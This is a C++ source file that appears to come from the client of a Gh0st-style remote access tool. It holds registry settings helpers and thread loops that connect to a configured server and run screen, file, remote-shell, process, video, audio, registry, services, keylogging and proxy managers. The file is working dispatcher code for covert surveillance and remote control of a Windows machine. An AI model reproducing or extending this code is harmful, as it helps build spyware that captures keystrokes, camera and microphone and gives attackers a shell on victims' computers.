#include "StdAfx.h"
#include "Common.h"

#include "ScreenManager.h"
#include "FileManager.h"
#include "TalkManager.h"
#include "ShellManager.h"
#include "SystemManager.h"
#include "AudioManager.h"
#include "RegisterManager.h"
#include "ServicesManager.h"
#include "VideoManager.h"
#include "KeyboardManager.h"
#include "ProxyManager.h"

#include "KernelManager.h" 

#define REG_SETTINGS "Software\\ServerD11\\Settings"

// 写入字符串配置（多字节版）
bool WriteAppSettingA(const std::string& keyName, const std::string& value) {
	HKEY hKey;

	LONG result = RegCreateKeyExA(
		HKEY_CURRENT_USER,
		REG_SETTINGS,
		0,
		NULL,
		0,
		KEY_WRITE,
		NULL,
		&hKey,
		NULL
	);

	if (result != ERROR_SUCCESS) {
		Mprintf("无法创建或打开注册表键，错误码: %d\n", result);
		return false;
	}

	result = RegSetValueExA(
		hKey,
		keyName.c_str(),
		0,
		REG_SZ,
		reinterpret_cast<const BYTE*>(value.c_str()),
		static_cast<DWORD>(value.length() + 1)
	);

	RegCloseKey(hKey);
	return result == ERROR_SUCCESS;
}

// 读取字符串配置（多字节版）
bool ReadAppSettingA(const std::string& keyName, std::string& outValue) {
	HKEY hKey;

	LONG result = RegOpenKeyExA(
		HKEY_CURRENT_USER,
		REG_SETTINGS,
		0,
		KEY_READ,
		&hKey
	);

	if (result != ERROR_SUCCESS) {
		return false;
	}

	char buffer[256];
	DWORD bufferSize = sizeof(buffer);
	DWORD type = 0;

	result = RegQueryValueExA(
		hKey,
		keyName.c_str(),
		nullptr,
		&type,
		reinterpret_cast<LPBYTE>(buffer),
		&bufferSize
	);

	RegCloseKey(hKey);

	if (result == ERROR_SUCCESS && type == REG_SZ) {
		outValue = buffer;
		return true;
	}

	return false;
}

DWORD WINAPI ThreadProc(LPVOID lParam)
{
	THREAD_ARG_LIST	ThreadArgList = {0};
	memcpy(&ThreadArgList,lParam,sizeof(THREAD_ARG_LIST));
	SetEvent(ThreadArgList.hEvent);

	DWORD dwReturn = ThreadArgList.StartAddress(ThreadArgList.lParam);
	return dwReturn;
}

template <class Manager, int n> DWORD WINAPI LoopManager(LPVOID lParam)
{
	ThreadInfo *pInfo = (ThreadInfo *)lParam;
	IOCPClient	*ClientObject = (IOCPClient *)pInfo->p;
	CONNECT_ADDRESS& g_SETTINGS(*(pInfo->conn));
	if (ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort()))
	{
		Manager	m(ClientObject, n, pInfo->user);
		ClientObject->RunEventLoop(pInfo->run);
	}
	delete ClientObject;
	pInfo->p = NULL;

	return 0;
}

DWORD WINAPI LoopScreenManager(LPVOID lParam)
{
	return LoopManager<CScreenManager, 0>(lParam);
}

DWORD WINAPI LoopFileManager(LPVOID lParam)
{
	return LoopManager<CFileManager, 0>(lParam);
}

DWORD WINAPI LoopTalkManager(LPVOID lParam)
{
	return LoopManager<CTalkManager, 0>(lParam);
}

DWORD WINAPI LoopShellManager(LPVOID lParam)
{
	return LoopManager<CShellManager, 0>(lParam);
}

DWORD WINAPI LoopProcessManager(LPVOID lParam)   
{
	return LoopManager<CSystemManager, COMMAND_SYSTEM>(lParam);
}

DWORD WINAPI LoopWindowManager(LPVOID lParam)
{
	return LoopManager<CSystemManager, COMMAND_WSLIST>(lParam);
}

DWORD WINAPI LoopVideoManager(LPVOID lParam)
{
	return LoopManager<CVideoManager, 0>(lParam);
}

DWORD WINAPI LoopAudioManager(LPVOID lParam)
{
	return LoopManager<CAudioManager, 0>(lParam);
}

DWORD WINAPI LoopRegisterManager(LPVOID lParam)
{
	return LoopManager<CRegisterManager, 0>(lParam);
}

DWORD WINAPI LoopServicesManager(LPVOID lParam)
{
	return LoopManager<CServicesManager, 0>(lParam);
}

DWORD WINAPI LoopKeyboardManager(LPVOID lParam)
{
	return LoopManager<CKeyboardManager1, 0>(lParam);
}

DWORD WINAPI LoopProxyManager(LPVOID lParam) {
	return LoopManager<CProxyManager, 0>(lParam);
}
